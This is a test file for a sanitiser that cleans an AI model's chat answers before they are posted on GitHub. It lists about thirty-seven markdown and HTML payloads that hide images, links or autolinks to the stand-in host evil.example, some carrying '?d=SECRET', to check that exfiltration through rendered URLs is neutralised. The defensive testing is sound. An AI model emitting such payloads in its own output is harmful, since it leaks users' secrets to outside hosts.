/**
 * LUM-1154 acceptance — the model's answer is posted on GitHub, where an
 * image (or anything else fetched on render) could carry data out in its
 * URL. Fail-safe: the dangerous constructs are neutralised EVERYWHERE, code
 * included — any divergence between our idea of "code" and GitHub's parser
 * would otherwise be a bypass (an indented closing fence, a code span across
 * a paragraph or a table cell). A link renders only to an allowlisted host
 * (github.com, uselumo.ai); any other URL is left as plain text.
 *
 * `dangerous` checks the whole posted text — no code exemption — for: an
 * image opener `![`, a reference definition `]:`, a raw HTML tag / autolink
 * `<` + letter / `/` / `!` / `?`, and a link `](` off the allowlist.
 */
import {
  CHAT_ANSWER_MAX_CHARS,
  cleanChatAnswer,
} from '@/ee/security/security-scan/pr-chat'

const EVIL = 'evil.example'

function dangerous(md: string): string[] {
  const hits: string[] = []
  // An image: `!` (not an entity, not backslash-escaped) right before `[`.
  if (/(^|[^\\])!\[/.test(md)) hits.push('image')
  // A reference definition (`[label]:` with a literal colon).
  if (/\]:/.test(md)) hits.push('reference definition')
  // A raw HTML tag, comment / declaration, or an autolink.
  if (/<[A-Za-z/!?]/.test(md)) hits.push('html tag or autolink')
  // A bare URL GitHub would autolink, off the allowlist.
  for (const m of md.matchAll(
    /\b(?:https?|ftp):\/\/[^\s)>\]]*|\bwww\.[^\s)>\]]*/gi
  )) {
    const url = m[0].startsWith('www.') ? `https://${m[0]}` : m[0]
    if (
      !/^https:\/\/(?:[a-z0-9-]+\.)*(?:github\.com|uselumo\.ai)(?:[/?#]|$)/i.test(
        url
      )
    )
      hits.push(`bare url ${m[0]}`)
  }
  // An inline link whose destination is not on an allowlisted host.
  for (const m of md.matchAll(/\]\(\s*<?([^)\s>]*)/g)) {
    const dest = m[1] ?? ''
    if (
      !/^https:\/\/(?:[a-z0-9-]+\.)*(?:github\.com|uselumo\.ai)(?:[/?#]|$)/i.test(
        dest
      )
    )
      hits.push(`link to ${dest}`)
  }
  return hits
}

/** What a reader sees: the inert separator is invisible. */
const visible = (md: string) => md.replace(/\u2060/g, '')

const BYPASSES: Array<[string, string]> = [
  ['inline image', `Look: ![x](https://${EVIL}/p.png?d=SECRET)`],
  [
    'reference-style image',
    `Look: ![x][ref]\n\n[ref]: https://${EVIL}/p.png?d=SECRET`,
  ],
  [
    'collapsed reference image',
    `Look: ![ref][]\n\n[ref]: https://${EVIL}/p.png`,
  ],
  ['shortcut reference image', `Look: ![ref]\n\n[ref]: https://${EVIL}/p.png`],
  [
    'indented reference definition',
    `![a][r]\n\n   [r]: https://${EVIL}/x "title"`,
  ],
  [
    'reference definition in a blockquote',
    `> ![a][r]\n>\n> [r]: https://${EVIL}/x`,
  ],
  ['nested brackets', `![a [b] c](https://${EVIL}/p.png)`],
  ['nested image in link', `[![a](https://${EVIL}/i.png)](https://${EVIL}/)`],
  ['angle-bracket destination', `![a](<https://${EVIL}/p q.png>)`],
  ['image with title', `![a](https://${EVIL}/p.png "t")`],
  [
    'image in a table',
    `| a | b |\n|---|---|\n| ![x](https://${EVIL}/t.png) | y |`,
  ],
  [
    'image in a list',
    `- one\n- ![x](https://${EVIL}/l.png)\n  - ![y][r]\n\n[r]: https://${EVIL}/r`,
  ],
  ['html img', `<img src="https://${EVIL}/i.png">`],
  [
    'html picture/source srcset',
    `<picture><source srcset="https://${EVIL}/s.png"><img src="x"></picture>`,
  ],
  ['html img uppercase', `<IMG SRC=https://${EVIL}/i.png>`],
  ['html video poster', `<video poster="https://${EVIL}/v.png"></video>`],
  ['autolink in an image', `![<https://${EVIL}/a.png>](https://${EVIL}/a.png)`],
  ['link to a non-allowlisted host', `[docs](https://${EVIL}/?d=SECRET)`],
  ['link with lookalike host', `[x](https://github.com.${EVIL}/a)`],
  ['bare url (autolinked by GitHub)', `see https://${EVIL}/?d=SECRET`],
  ['bare www url', `see www.${EVIL}/?d=SECRET`],
  [
    'fake fence (backtick in info string) hiding an image',
    '```js`x\n![x](https://' + EVIL + '/f.png)\n```',
  ],
  [
    'indented fence hiding an image',
    '  ```\n![x](https://' + EVIL + '/f.png)\n  ```',
  ],
  [
    'unbalanced inline code hiding an image',
    // No closing run of two, no second single: every backtick is literal,
    // so markdown renders the image — the sanitiser must not take it as code.
    'a `` x ` ![i](https://' + EVIL + '/c.png)',
  ],
  ['escaped backslash before image', `\\\\![x](https://${EVIL}/b.png)`],
  // Manual review of eb8a132: code detection that diverges from GitHub's.
  [
    'indented closing fence',
    '```\ncode\n   ```\n![x](https://' + EVIL + '/i.png)\n',
  ],
  [
    'indented closing tilde fence',
    '~~~\ncode\n  ~~~\n![x](https://' + EVIL + '/t.png)\n',
  ],
  [
    'indented opening fence',
    '   ```\n![x](https://' + EVIL + '/o.png)\n   ```',
  ],
  [
    'code span across a paragraph break',
    'a `x\n\n![i](https://' + EVIL + '/p.png)\n\n` b',
  ],
  [
    'code span across table cells',
    '| a | b |\n|---|---|\n| `x | ![i](https://' + EVIL + '/c.png) | y` |',
  ],
  ['inside a fenced block', '```\n![x](https://' + EVIL + '/f.png)\n```'],
  ['inside a tilde block', '~~~md\n![x](https://' + EVIL + '/f.png)\n~~~'],
  [
    'inside an indented code block',
    'x\n\n    ![x](https://' + EVIL + '/f.png)',
  ],
  ['inside inline code', 'see `![x](https://' + EVIL + '/f.png)`'],
  ['html inside code', '```\n<img src="https://' + EVIL + '/i.png">\n```'],
  ['autolink', `see <https://${EVIL}/a>`],
  [
    'reference definition inside code',
    '```\n[r]: https://' + EVIL + '\n```\n![a][r]',
  ],
]

describe('answer sanitisation neutralises image / link exfiltration', () => {
  it.each(BYPASSES)('%s', (_name, raw) => {
    const out = cleanChatAnswer(raw)
    expect(out).not.toBeNull()
    expect(dangerous(out!)).toEqual([])
  })

  it('code reads the same to a person (the separator is invisible)', () => {
    const raw =
      'Fix:\n```rust\nlet v = vec![1, 2];\nlet g: Vec<u8> = x;\n```\nUse `vec![0; n]` and `Map<K, V>`.'
    const out = cleanChatAnswer(raw)!
    expect(dangerous(out)).toEqual([])
    expect(visible(out)).toBe(raw)
  })

  it('links to github.com / uselumo.ai stay links', () => {
    const out = cleanChatAnswer(
      'See [the docs](https://docs.github.com/en/x) and [Lumo](https://www.uselumo.ai/docs).'
    )!
    expect(out).toContain('[the docs](https://docs.github.com/en/x)')
    expect(out).toContain('[Lumo](https://www.uselumo.ai/docs)')
  })

  it('a URL that is not allowlisted survives as plain, unlinked text', () => {
    const out = cleanChatAnswer(
      '[docs](https://example.com/a) www.example.com'
    )!
    expect(visible(out)).toBe('[docs](https://example.com/a) www.example.com')
    expect(dangerous(out)).toEqual([])
  })

  it('generics in prose still read as generics', () => {
    expect(visible(cleanChatAnswer('Returns Map<string, number>.')!)).toBe(
      'Returns Map<string, number>.'
    )
  })

  it('rendered-diagram fences (mermaid, geojson, …) become plain code', () => {
    const out = cleanChatAnswer(
      '```mermaid\ngraph TD; A-->B; click A "https://evil.example"\n```'
    )!
    expect(out.startsWith('```text\n')).toBe(true)
  })
})

describe('code fences are always balanced', () => {
  it('an unclosed fence is closed even without a length cut', () => {
    const out = cleanChatAnswer('Try:\n```ts\nconst a = 1')!
    expect(out.endsWith('\n```')).toBe(true)
  })
  it('a longer fence is closed with the same length', () => {
    expect(cleanChatAnswer('````md\n```\ninner\n```')!.endsWith('\n````')).toBe(
      true
    )
  })
  it('a cut inside a fence is closed and stays under the cap', () => {
    const out = cleanChatAnswer(`See:\n~~~\n${'x'.repeat(10_000)}`)!
    expect(out.endsWith('\n~~~')).toBe(true)
    expect(out.length).toBeLessThanOrEqual(CHAT_ANSWER_MAX_CHARS)
  })
})
